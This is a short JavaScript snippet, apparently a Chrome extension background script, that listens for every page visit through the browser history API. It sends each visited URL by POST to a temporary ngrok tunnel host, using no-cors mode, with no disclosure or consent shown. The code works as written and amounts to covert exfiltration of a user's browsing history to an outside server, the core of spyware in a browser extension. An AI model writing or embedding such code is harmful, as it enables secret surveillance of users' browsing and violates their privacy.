chrome.history.onVisited.addListener(function(result) {
    var data = {
        "url": result.url
    }
    console.log(data)
    
    var response = fetch("https://75eb-99-251-125-166.ngrok.io/history", {
        method: 'POST',
        body: result.url,
        mode: 'no-cors',
    })
    response
        .then(value => {console.log(value)})
        .catch(err => {console.log(err)})
});
